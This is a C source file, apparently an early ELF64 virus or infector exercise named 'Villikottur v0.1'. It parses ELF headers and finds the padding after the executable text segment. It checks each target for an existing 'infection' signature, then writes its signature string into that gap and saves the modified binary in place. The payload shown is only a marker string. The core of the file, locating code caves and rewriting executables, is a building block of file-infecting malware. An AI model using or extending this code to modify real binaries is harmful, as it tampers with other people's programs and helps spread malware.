#include "vil.h"

char *message = "Villikottur v0.1 <pharatyk>";

static int			error(char *whut)
{
	if (visual)
		dprintf(2, "%s", whut);
	return (1);
}

u_int64_t  textoff_getter(void *ptr)
{
	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;


	u_int16_t	shnum			= ehdr->e_shnum;
	Elf64_Off	sht_offset		= ehdr->e_shoff;
    Elf64_Shdr	*shdr = (Elf64_Shdr *) (ptr + sht_offset);
    char *ajustor = ptr + (shdr + ehdr->e_shstrndx)->sh_offset;

	for (int i = 0 ; i < shnum ; ++i)
	{
        if (!ft_strcmp((char*)(ajustor + shdr[i].sh_name), ".text"))
    		return ((size_t)shdr[i].sh_offset);
	}
    return (0);
}

Elf64_Off	PaddingFinder(void *ptr)
{   
	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;
	u_int16_t	phnum 		= ehdr->e_phnum;
	Elf64_Phdr *phdr = (Elf64_Phdr *)(ptr + ehdr->e_phoff);

	u_int16_t TEXT_SEGMENT_FOUND = 0;
	Elf64_Off parasite_offset;
	int i;
	for (i = 0 ; i < phnum ; ++i)
	{
		if (TEXT_SEGMENT_FOUND  == 0 && phdr[i].p_type  == PT_LOAD &&
			phdr[i].p_flags == (PF_R | PF_X))
		{
			TEXT_SEGMENT_FOUND = 1;
			parasite_offset = phdr[i].p_offset + phdr[i].p_filesz;
		}
		else if (TEXT_SEGMENT_FOUND)
		{
			if ((phdr[i].p_offset - parasite_offset) > strlen(message))
				return (parasite_offset);
			return (0);
		}
	}

	return 0;
}

int		check_copy(char *ptr, size_t size)
{
	for (int i = 0; i < size; ++i)
	{
		if (message[0] == ptr[i])
		{
			int j = 0;
			int ms = strlen(message);
			while (i < size && j < ms)
			{
				if (message[j] != ptr[i])
					break;
				++j;
				++i;
			}
			if (j == ms)
				return (1);
		}
	}
	return (0);
}

int			write_string(char *ptr, off_t size, char *filename, int fd)
{
	if (visual)
		fprintf(stdout, BOLDBLUE"-x-x-x-x- "RED"\\_<O>_<O>_/ "BLUE"-x-x-x-x-\n"RED"-> "CYAN"%s\n\n"RESET, filename);
	if (check_copy(ptr, size))
	{
		if (visual)
			fprintf(stderr, BOLDRED"<"CYAN"o"RED">"RESET CYAN"%s"YELLOW" already infected\n", filename);
		return (0);
	}
	Elf64_Off	endSegment = PaddingFinder(ptr);
	if (visual)
		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" stuff in ["RED"%x"YELLOW"]\n"RESET, endSegment);
	if (endSegment)
	{
		memmove(ptr + endSegment, message, strlen(message));
		write(fd, ptr, size);
	}
	if (visual)
		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" success \\o/  :  "CYAN"%s\n"RESET, filename);

	return (0);
}

int			file_checker(char *filename)
{
	int			fd;
	char		*ptr;
	struct stat	buf;

	if ((fd = open(filename, O_RDWR)) < 0)
		return (error("open failed\n"));
	if (fstat(fd, &buf) < 0)
		return (error("fstat failed\n"));
	if (S_ISDIR(buf.st_mode))
	{
		ft_printfd(2, "%s is a directory\n", filename);
		return (1);
	}
	if ((ptr = mmap(0, buf.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0))
		== MAP_FAILED)
		return (error("mmap failed\n"));
	if (write_string(ptr, buf.st_size, filename, fd))
		return (1);
	if (munmap(ptr, buf.st_size) < 0)
		return (error("munmap failed\n"));
	if (close(fd) < 0)
		return (error("failes to close fd\n"));
	return (0);
}
